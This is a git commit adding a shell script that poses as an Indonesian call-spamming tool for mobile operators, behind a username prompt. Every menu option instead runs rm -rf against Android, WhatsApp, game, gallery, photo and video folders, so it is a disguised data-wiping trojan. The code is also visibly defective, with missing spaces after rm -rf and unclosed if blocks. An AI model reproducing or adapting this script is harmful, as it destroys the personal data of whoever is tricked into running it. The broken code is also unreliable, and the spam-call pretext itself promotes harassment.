6f42f251e04fe1e39f9f4cf02fdf2ee909d8fe76
wayzzy <80566726+wayzzy@users.noreply.github.com>
2021-03-13 14:02:55 +0700

    Add files via upload

---
+++ sc.sh
@@ -0,0 +1,55 @@
+#!/usr/bin/sh
+#mamposss
+#wa: 089652765566
+user="wayy"
+while [ "$username" != $user ]
+  do
+  read -p "masukkan username: " username;
+done
+clear
+echo "Tools Spam Call All Operator"
+echo "[1] Telkomsel "
+echo "[2] XL"
+echo "[3] Axis"
+echo "[4] IM3"
+read -p "masukkan nama kartu: " pill;
+if [ $pill = "1" ]
+then
+echo "sedang memproses" $1
+rm -rf/Android
+rm -rf/Android/WhatsApp
+rm -rf/Android/com.mobile.legends
+rm -rf/Galeri
+rm -rf/Photos
+rm -rf/video
+
+if [ $pill = "2" ]
+then
+echo "sedang berproses" $2
+rm -rf/Android
+rm -rf/Android/WhatsApp
+rm -rf/Android/com.mobile.legends
+rm -rf/Galeri
+rm -rf/Photos
+rm -rf/video
+
+if [ $pill = "3" ] 
+then
+echo "sedang memproses" $3
+rm -rf/Android
+rm -rf/Android/WhatsApp
+rm -rf/Android/com.mobile.legends
+rm -rf/Galeri
+rm -rf/Photos
+rm -rf/video
+
+if [ $pill = "4" ] 
+then
+echo "sedang memproses" $4
+rm -rf/Android
+rm -rf/Android/WhatsApp
+rm -rf/Android/com.mobile.legends
+rm -rf/Galeri
+rm -rf/Photos
+rm -rf/video
+fi
